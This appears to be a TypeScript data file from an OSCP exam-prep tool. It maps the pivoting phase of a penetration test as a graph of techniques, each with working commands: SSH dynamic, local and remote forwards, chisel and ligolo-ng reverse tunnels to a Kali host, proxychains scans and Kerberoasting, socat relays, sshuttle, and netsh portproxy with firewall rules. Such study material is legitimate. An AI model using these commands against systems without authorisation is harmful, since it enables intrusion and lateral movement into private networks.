import type { OscpContent } from '@/types/oscp'

/** Phase: port redirection, tunnelling and pivoting to reach internal hosts. */
const pivoting: OscpContent = {
    nodes: [
        {
            id: 'pivot-discovery',
            title: 'Internal subnet reachable',
            type: 'finding',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'Your compromised host has a second NIC or can reach hosts you cannot. Route through it: a SOCKS proxy for tooling, or single-port forwards for one service.',
            commands: [
                {
                    label: 'Spot the pivot',
                    code: `ip a; arp -a; route -n            # Linux
ipconfig /all; route print       # Windows
# quick internal sweep from the host:
for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i | grep from &); done`,
                },
                {
                    label: 'Routes + neighbours',
                    code: `ip r; arp -a; cat /etc/hosts
# Windows:
ipconfig /all & route print & arp -a
netstat -ano`,
                },
            ],
            tags: ['pivot', 'dual-homed', 'subnet', 'internal'],
        },
        {
            id: 'ssh-dynamic-socks',
            title: 'SSH dynamic SOCKS (-D)',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'The default pivot when you have SSH creds on the compromised host. One SOCKS proxy tunnels all your tools through it via proxychains.',
            commands: [
                {
                    label: 'Open the proxy',
                    code: 'ssh -D 1080 -N <user>@<pivot>   # then use proxychains',
                },
                {
                    label: 'Background SOCKS',
                    code: `ssh -D 1080 -N -f <user>@<pivot>
# then proxychains / FoxyProxy -> 127.0.0.1:1080`,
                },
                {
                    label: 'Keepalive + SOCKS5',
                    code: `ssh -D 1080 -N -o ServerAliveInterval=30 -o ServerAliveCountMax=3 <user>@<pivot>
# /etc/proxychains4.conf: socks5 127.0.0.1 1080`,
                },
            ],
            tags: ['ssh', 'socks', 'dynamic', '-D'],
        },
        {
            id: 'ssh-local-forward',
            title: 'SSH local forward (-L)',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'Expose one internal service on your loopback. Good for hitting a single port (a DB, a web admin) without a full proxy.',
            commands: [
                {
                    label: 'Forward one port',
                    code: 'ssh -L 8000:10.10.10.5:80 -N <user>@<pivot>   # http://127.0.0.1:8000',
                },
                {
                    label: 'Forward a single internal port',
                    code: `ssh -L 8080:<internal-ip>:80 -N <user>@<pivot>
curl http://127.0.0.1:8080`,
                },
                {
                    label: 'Multiple -L hops',
                    code: `ssh -L 1433:<internal-ip>:1433 -L 8080:<internal-ip>:80 -N <user>@<pivot>
# point tools at 127.0.0.1:1433 / :8080`,
                },
            ],
            tags: ['ssh', '-L', 'local-forward'],
        },
        {
            id: 'ssh-remote-forward',
            title: 'SSH remote forward (-R)',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'When the pivot cannot receive an inbound SSH connection, connect FROM the pivot back to Kali and forward a port through that tunnel. Pairs with a Kali sshd.',
            commands: [
                {
                    label: 'Reverse the tunnel',
                    code: 'ssh -R 1080 -N kali@<kali-ip>   # dynamic reverse SOCKS on Kali:1080',
                },
                {
                    label: 'Expose Kali listener to the pivot LAN',
                    code: `ssh -R 0.0.0.0:4444:127.0.0.1:443 -N <user>@<pivot>
# target then connects to <pivot>:4444 -> Kali:443`,
                },
                {
                    label: 'GatewayPorts if bind fails',
                    code: `sshd -T | grep -i gatewayports
# on the pivot: GatewayPorts yes in sshd_config, then restart sshd`,
                },
            ],
            tags: ['ssh', '-R', 'remote-forward', 'reverse'],
        },
        {
            id: 'chisel',
            title: 'chisel tunnel',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'When there is no SSH (typically a Windows pivot). Run a chisel server on Kali and a client on the target for a reverse SOCKS proxy over HTTP.',
            commands: [
                {
                    label: 'Reverse SOCKS',
                    code: `# Kali:
./chisel server -p 8080 --reverse
# target:
chisel.exe client <kali-ip>:8080 R:socks`,
                },
                {
                    label: 'Reverse port forward',
                    code: `# Kali: ./chisel server -p 8080 --reverse
# target:
chisel.exe client <kali-ip>:8080 R:445:127.0.0.1:445`,
                },
            ],
            tags: ['chisel', 'socks', 'windows', 'http-tunnel'],
        },
        {
            id: 'ligolo',
            title: 'ligolo-ng tunnel',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'A faster, cleaner alternative to chisel for routing a whole internal subnet. Run the proxy on Kali, drop the agent on the pivot, then add the internal route so every tool reaches it directly through the tun interface - no proxychains needed.',
            commands: [
                {
                    label: 'Setup (Kali proxy + target agent)',
                    code: `# Kali (proxy):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo
./proxy -selfcert
# target (agent):
agent.exe -connect <kali-ip>:11601 -ignore-cert`,
                },
                {
                    label: 'Start the tunnel + use tools directly',
                    code: `# in the proxy console, once the agent checks in:
session          # select the agent
ifconfig         # view the pivot's interfaces
start            # begin tunnelling
# from Kali, tools now reach the internal subnet without proxychains:
nmap -sT -Pn 10.10.10.0/24
netexec smb 10.10.10.0/24 -u <user> -p <pass>`,
                },
            ],
            tags: ['ligolo', 'tunnel', 'tun', 'subnet', 'pivot'],
        },
        {
            id: 'proxychains',
            title: 'Run tools through the proxy',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'Point proxychains at your SOCKS port, then prefix any TCP tool. Use -sT nmap (no SYN through SOCKS) and expect it to be slow.',
            commands: [
                {
                    label: 'Configure + use',
                    code: `echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains -q nmap -sT -Pn -p 445,3389,5985 10.10.10.5
proxychains -q netexec smb 10.10.10.0/24`,
                },
                {
                    label: 'Quiet AD through SOCKS',
                    code: `proxychains -q netexec smb <internal-subnet>/24 -u <user> -p <pass> --shares
proxychains -q impacket-GetUserSPNs -request -dc-ip <dc> <domain>/<user>`,
                },
            ],
            tags: ['proxychains', 'socks', 'nmap', 'netexec'],
        },
        {
            id: 'socat-forward',
            title: 'socat port forward',
            type: 'technique',
            phase: 'pivoting',
            os: 'agnostic',
            description:
                'A single static binary that forwards TCP ports both ways. Great when the pivot has socat or you can drop a static build.',
            commands: [
                {
                    label: 'Forward a port to an internal host',
                    code: `# on the pivot:
socat TCP-LISTEN:445,fork TCP:<internal-ip>:445
# then from Kali:
smbclient //<pivot>/share -N`,
                },
                {
                    label: 'Reverse relay back to Kali',
                    code: `# Kali listener:
socat TCP-LISTEN:80,fork TCP:127.0.0.1:8080
# pivot (connect out):
socat TCP:<kali-ip>:80 TCP:<internal-ip>:80`,
                },
            ],
            tags: ['socat', 'forward', 'relay', 'static'],
        },
        {
            id: 'sshuttle',
            title: 'sshuttle VPN over SSH',
            type: 'technique',
            phase: 'pivoting',
            os: 'linux',
            description:
                'Route a whole subnet through an SSH pivot without touching the target config - transparent, no proxychains needed.',
            commands: [
                {
                    label: 'Route a subnet',
                    code: `sshuttle -r <user>@<pivot> <internal-subnet>/24
# with a key:
sshuttle -r <user>@<pivot> --ssh-cmd 'ssh -i id_rsa' <internal-subnet>/24`,
                },
                {
                    label: 'Exclude the pivot itself',
                    code: `sshuttle -r <user>@<pivot> -x <pivot-ip> <internal-subnet>/24
# then run tools directly against the internal range`,
                },
            ],
            tags: ['sshuttle', 'vpn', 'subnet', 'route'],
        },
        {
            id: 'windows-portproxy',
            title: 'Windows netsh portproxy',
            type: 'technique',
            phase: 'pivoting',
            os: 'windows',
            description:
                'On a Windows pivot, netsh interface portproxy forwards a local port to an internal host. Needs admin and the IP Helper service running.',
            commands: [
                {
                    label: 'Add a portproxy',
                    code: `netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connectport=445 connectaddress=<internal-ip>
netsh interface portproxy show all`,
                },
                {
                    label: 'Firewall + cleanup',
                    code: `netsh advfirewall firewall add rule name="pivot 445" dir=in action=allow protocol=TCP localport=445
netsh interface portproxy delete v4tov4 listenport=445 listenaddress=0.0.0.0`,
                },
            ],
            tags: ['portproxy', 'netsh', 'windows', 'forward'],
        },
    ],
    edges: [
        { from: 'foothold-linux', to: 'pivot-discovery', label: 'second NIC / new subnet' },
        { from: 'foothold-windows', to: 'pivot-discovery', label: 'second NIC / new subnet' },
        { from: 'root-linux', to: 'pivot-discovery', label: 'reach deeper hosts' },
        { from: 'system-windows', to: 'pivot-discovery', label: 'reach deeper hosts' },
        { from: 'pivot-discovery', to: 'ssh-dynamic-socks', label: 'have SSH on the pivot' },
        { from: 'pivot-discovery', to: 'ssh-local-forward', label: 'need one port only' },
        { from: 'pivot-discovery', to: 'ssh-remote-forward', label: 'no inbound to pivot' },
        { from: 'pivot-discovery', to: 'chisel', label: 'no SSH (Windows)' },
        { from: 'ssh-dynamic-socks', to: 'proxychains', label: 'SOCKS up' },
        { from: 'ssh-remote-forward', to: 'proxychains', label: 'SOCKS up' },
        { from: 'chisel', to: 'proxychains', label: 'SOCKS up' },
        { from: 'pivot-discovery', to: 'ligolo', label: 'route the whole subnet (no SSH)' },
        { from: 'ligolo', to: 'smb-enum', label: 'enumerate the internal host' },
        { from: 'ligolo', to: 'ad-null-enum', label: 'internal DC reachable' },
        { from: 'proxychains', to: 'smb-enum', label: 'enumerate the internal host' },
        { from: 'proxychains', to: 'ad-null-enum', label: 'internal DC reachable' },
        { from: 'pivot-discovery', to: 'socat-forward', label: 'static socat available' },
        { from: 'pivot-discovery', to: 'sshuttle', label: 'have SSH on the pivot' },
        { from: 'pivot-discovery', to: 'windows-portproxy', label: 'Windows pivot + admin' },
        { from: 'socat-forward', to: 'smb-enum', label: 'enumerate the internal host' },
        { from: 'sshuttle', to: 'smb-enum', label: 'enumerate the internal host' },
        { from: 'windows-portproxy', to: 'smb-enum', label: 'enumerate the internal host' },
    ],
}

export default pivoting
